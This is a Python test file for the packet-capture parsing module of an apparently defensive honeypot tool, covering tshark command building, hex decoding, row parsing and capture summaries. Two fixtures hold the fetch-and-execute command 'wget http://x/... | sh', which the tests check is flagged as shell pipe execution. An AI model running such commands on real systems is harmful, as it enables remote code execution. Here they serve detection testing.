"""tshark command construction and output parsing.

These run without tshark installed: the command builder and the line parser are
pure, which is why the subprocess boundary was kept as narrow as it is.
"""

from __future__ import annotations

import gzip
from pathlib import Path

import pytest

from deception_shield.pcap import (
    DEFAULT_DISPLAY_FILTER,
    FIELD_SEPARATOR,
    TSHARK_FIELDS,
    _decode_hex,
    _materialise,
    build_command,
    capture_summary,
    parse_field_line,
)


def field_line(
    epoch: str = "1789000000.123456",
    src: str = "203.0.113.9",
    dst: str = "10.90.0.5",
    tcp_sport: str = "54321",
    tcp_dport: str = "80",
    udp_sport: str = "",
    udp_dport: str = "",
    stream: str = "7",
    protocol: str = "HTTP",
    tcp_payload: str = "",
    udp_payload: str = "",
) -> str:
    """Assemble a row in the exact column order tshark emits."""
    return FIELD_SEPARATOR.join(
        [epoch, src, dst, tcp_sport, tcp_dport, udp_sport, udp_dport, stream, protocol, tcp_payload, udp_payload]
    )


class TestCommandConstruction:
    def test_every_field_is_requested(self) -> None:
        command = build_command(Path("/pcap/a.pcap"))
        for field in TSHARK_FIELDS:
            assert field in command
        assert command.count("-e") == len(TSHARK_FIELDS)

    def test_reassembly_is_enabled(self) -> None:
        """Without desegmentation a payload split across frames is truncated."""
        command = build_command(Path("/pcap/a.pcap"))
        assert "tcp.desegment_tcp_streams:TRUE" in command

    def test_first_occurrence_only(self) -> None:
        """Multiple occurrences per field would break column alignment."""
        assert "occurrence=f" in build_command(Path("/pcap/a.pcap"))

    def test_display_filter_is_applied(self) -> None:
        command = build_command(Path("/pcap/a.pcap"))
        assert command[command.index("-Y") + 1] == DEFAULT_DISPLAY_FILTER

    def test_custom_filter_is_honoured(self) -> None:
        command = build_command(Path("/a.pcap"), display_filter="tcp.port == 22")
        assert command[command.index("-Y") + 1] == "tcp.port == 22"


class TestHexDecoding:
    @pytest.mark.parametrize(
        ("raw", "expected"),
        [
            ("48:54:54:50", b"HTTP"),
            ("48545450", b"HTTP"),
            ("48 54 54 50", b"HTTP"),
            ("", b""),
            ("zz", b""),
        ],
    )
    def test_accepted_forms(self, raw: str, expected: bytes) -> None:
        assert _decode_hex(raw) == expected

    def test_odd_length_is_truncated_not_fatal(self) -> None:
        assert _decode_hex("4854545") == b"HTT"


class TestLineParsing:
    def test_tcp_row_becomes_a_record(self) -> None:
        record = parse_field_line(field_line(tcp_payload=b"GET / HTTP/1.1".hex()))
        assert record is not None
        assert record.source_ip == "203.0.113.9"
        assert record.destination_port == 80
        assert record.transport == "tcp"
        assert record.stream_id == 7
        assert record.payload == b"GET / HTTP/1.1"

    def test_udp_row_uses_udp_ports(self) -> None:
        record = parse_field_line(
            field_line(tcp_sport="", tcp_dport="", udp_sport="5353", udp_dport="53",
                       protocol="DNS", udp_payload=b"query".hex())
        )
        assert record is not None
        assert record.transport == "udp"
        assert record.source_port == 5353
        assert record.destination_port == 53

    def test_record_is_scored_during_parsing(self) -> None:
        record = parse_field_line(field_line(tcp_payload=b"wget http://x/m.sh | sh".hex()))
        assert record is not None
        assert record.score > 0
        assert "shell_pipe_execution" in record.signatures

    def test_sensor_id_is_attached(self) -> None:
        record = parse_field_line(field_line(tcp_payload=b"data".hex()), sensor_id="sensor-3")
        assert record is not None and record.sensor_id == "sensor-3"

    @pytest.mark.parametrize(
        ("line", "reason"),
        [
            ("", "blank line"),
            ("   \n", "whitespace only"),
            (field_line(src="", dst=""), "no IP layer"),
            (field_line(tcp_payload=""), "no payload"),
            (field_line(epoch="not-a-time", tcp_payload="41"), "unparseable timestamp"),
            (field_line(tcp_sport="", udp_sport="", tcp_payload="41"), "no transport ports"),
            (field_line(tcp_sport="abc", tcp_payload="41"), "non numeric port"),
        ],
    )
    def test_unusable_rows_return_none(self, line: str, reason: str) -> None:
        assert parse_field_line(line) is None, reason

    def test_short_row_is_padded_not_fatal(self) -> None:
        """A truncated row must not raise; it simply yields no record."""
        assert parse_field_line("1789000000.1\t203.0.113.9") is None

    def test_missing_stream_id_is_tolerated(self) -> None:
        record = parse_field_line(field_line(stream="", tcp_payload=b"x".hex()))
        assert record is not None and record.stream_id is None


class TestMaterialise:
    def test_plain_capture_is_passed_through(self, tmp_path: Path) -> None:
        capture = tmp_path / "a.pcap"
        capture.write_bytes(b"\xd4\xc3\xb2\xa1")
        target, temporary = _materialise(capture)
        assert target == capture and temporary is None

    def test_gzipped_capture_is_expanded(self, tmp_path: Path) -> None:
        """tshark cannot read the gzipped rotations tcpdump produces."""
        capture = tmp_path / "a.pcap.gz"
        with gzip.open(capture, "wb") as handle:
            handle.write(b"\xd4\xc3\xb2\xa1payload")

        target, temporary = _materialise(capture)
        try:
            assert temporary is not None
            assert target.read_bytes() == b"\xd4\xc3\xb2\xa1payload"
        finally:
            if temporary:
                temporary.unlink(missing_ok=True)


class TestCaptureSummary:
    def test_empty_input(self) -> None:
        assert capture_summary([])["records"] == 0

    def test_counts_and_window(self) -> None:
        records = [
            parse_field_line(field_line(src="203.0.113.1", tcp_payload=b"wget http://x/a | sh".hex())),
            parse_field_line(field_line(src="203.0.113.2", tcp_dport="443", tcp_payload=b"hello".hex())),
        ]
        summary = capture_summary([r for r in records if r])
        assert summary["records"] == 2
        assert summary["sources"] == 2
        assert summary["ports"] == [80, 443]
        assert summary["flagged"] == 1
        assert len(summary["window"]) == 2
